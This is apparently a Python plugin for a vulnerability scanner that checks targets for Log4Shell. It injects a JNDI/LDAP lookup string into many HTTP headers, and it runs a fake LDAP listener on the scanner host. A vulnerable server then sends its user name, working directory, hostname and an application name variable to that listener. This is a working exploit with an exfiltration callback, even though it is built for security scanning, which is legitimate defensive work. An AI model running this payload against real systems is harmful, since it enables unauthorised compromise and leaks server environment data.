#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *
import threading
import socket
import struct


def get_scanner_ip():
    for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
        if ip.startswith('10.'):
            return ip
    return


def get_headers(poc):
    headers = {
        "Accept-Language": poc,
        "Origin": poc,
        "User-Agent": poc,
        "Referer": poc,
        "X-Forwarded-For": poc,
        "Cookie": poc,
        "If-Modified-Since": poc,
        "Accept": poc,
        "X-Api-Version": poc,
    }
    return headers


class SocketServerThread(threading.Thread):
    def __init__(self, ip):
        super(SocketServerThread, self).__init__()
        self.ip = ip
        self.port = 0
        self.result = None

    def run(self):
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.settimeout(10)
            soc.bind((self.ip, 0))
            self.port = soc.getsockname()[1]
            logger.info('Bind port: %s' % self.port)
            soc.listen(3)

            c, addr = soc.accept()
            data = c.recv(1024)
            if not data.startswith(bytes.fromhex("300c0201016007")):
                c.close()
            else:
                c.send(bytes.fromhex("300c02010161070a010004000400"))
                data2 = c.recv(1024)
                payload = str(data2).split("xxx")[1]
                user, pwd, hostname, qae_app_name = payload.split("-a1a-")
                c.close()
                if all([user, pwd, hostname, qae_app_name]):
                    self.result = [addr[0], user, pwd, hostname, qae_app_name]

        except Exception as e:
            pass
        finally:
            try:
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                soc.close()
            except Exception as e:
                pass

    def get_result(self):
        return self.result

    def get_port(self):
        return self.port if self.port else 0


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        url = "{}://{}:{}/hello".format(service, ip, port)
        scanner_ip = get_scanner_ip()
        if not scanner_ip:
            return
        t = SocketServerThread(scanner_ip)
        t.setName("socket-log4j")
        t.start()
        await asyncio.sleep(1)
        random_port = t.get_port()

        poc = "${jndi:ldap://%s:%d/xxx${env:USER}-a1a-${env:PWD}-a1a-${env:hostName}-a1a-${env:QAE_APP_NAME}xxx}" % (
            scanner_ip, random_port)
        try:
            await http_client(ip, port).get(url, headers=get_headers(poc), timeout=20)
        except Exception as e:
            pass

        await asyncio.sleep(5)
        result = t.result
        if result:
            msg = "from:  {}\nuser: {}\nhostname: {}\npwd: {}\nqae_app_name: {}".format(
                result[0], result[1], result[3], result[2], result[4])
            ret = {
                'alert_group': 'Log4Shell Socket Verify',
                'affects': url,
                'details': msg,
            }
            return ret
    except Exception as e:
        debug(e)
        

if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, {})
    run_plugin_test(scan)
